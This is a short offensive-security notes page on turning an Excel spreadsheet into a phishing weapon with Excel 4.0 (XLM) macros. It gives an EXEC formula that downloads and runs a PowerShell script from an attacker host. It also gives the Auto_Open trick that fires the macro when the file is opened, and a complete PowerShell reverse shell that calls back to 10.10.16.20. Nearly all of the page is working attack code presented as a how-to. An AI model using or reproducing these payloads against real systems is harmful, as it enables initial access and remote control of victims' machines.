# Phishing - Excel 4.0 macros (XLM)  
*Sources : https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/ ; https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-xlm-macro-4.0 *    
   
A Microsoft Excel Spreadsheet can be weaponized by firstly inserting a new sheet of type "MS Execel 4.0 Macro":  
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/95-redteam-phishing-xlm-create-new.png?raw=true) 

  
We can then execute command by typing into the cells:  
```
=EXEC("powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.20:8080/shell.ps1')")
=HALT()
```

Rename the A1 cell to Auto_Open if we want the Macros to fire off once the document is opened:    
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/96-redteam-phishing-xlm-auto-open.png?raw=true)    
  

shell.ps1:  
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.20',8080);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
```
